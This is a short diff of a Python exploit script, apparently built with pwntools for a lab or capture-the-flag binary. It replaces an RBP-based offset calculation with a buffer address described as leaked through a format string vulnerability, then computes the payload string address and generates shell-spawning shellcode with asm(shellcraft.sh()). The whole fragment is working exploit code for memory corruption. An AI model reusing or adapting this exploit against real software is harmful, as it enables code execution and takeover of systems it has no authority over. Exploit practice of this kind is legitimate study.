@@ -23,14 +23,14 @@ else:
 CHAR_ARRAY_SIZE = 0x120
 
 
-# in GDB the rbp address is this one, but the dump of the stack given by the program gives 0x7fffffffc880 as rbp
-RBP_ADDRESS = 0x7fffffffc7b0
+# This is the address of the buffer "line", got from the format string vulnerability
+LINE_BUFFER_ADDRESS = 0x7fffffffc770
 GDB_OFFSET = 208
 
 QUIT_0_SIZE = 5
 
 
-string_address = RBP_ADDRESS - CHAR_ARRAY_SIZE + GDB_OFFSET + QUIT_0_SIZE
+string_address = LINE_BUFFER_ADDRESS + QUIT_0_SIZE
 
 #log.info(address_str)
 bindshell = asm(shellcraft.sh())
